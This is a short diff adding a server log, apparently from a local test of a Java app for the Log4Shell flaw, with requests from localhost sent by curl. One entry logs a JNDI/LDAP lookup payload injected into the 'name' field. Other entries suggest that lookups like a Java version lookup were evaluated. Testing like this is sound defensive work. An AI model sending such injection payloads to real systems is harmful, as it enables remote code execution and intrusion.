@@ -1,0 +1,10 @@
+2026-09-28 21:59:04.148 INFO  Request from /127.0.0.1:56561 name=Sreyasi
+2026-09-28 21:59:04.152 INFO  UA=curl/8.21.0
+2026-09-28 22:09:12.123 INFO  Request from /127.0.0.1:56198 name=Sreyasi
+2026-09-28 22:09:12.123 INFO  UA=curl/8.21.0
+2026-09-28 22:10:58.990 INFO  Request from /127.0.0.1:53357 name=Java version 17.0.17
+2026-09-28 22:10:58.990 INFO  UA=curl/8.21.0
+2026-09-28 22:14:15.788 INFO  Request from /127.0.0.1:59693 name=${jndi:ldap://127.0.0.1:1389/test}
+2026-09-28 22:14:15.860 INFO  UA=curl/8.21.0
+2026-09-28 22:14:46.087 INFO  Request from /127.0.0.1:59693 name=test
+2026-09-28 22:14:46.087 INFO  UA=Java version 17.0.17
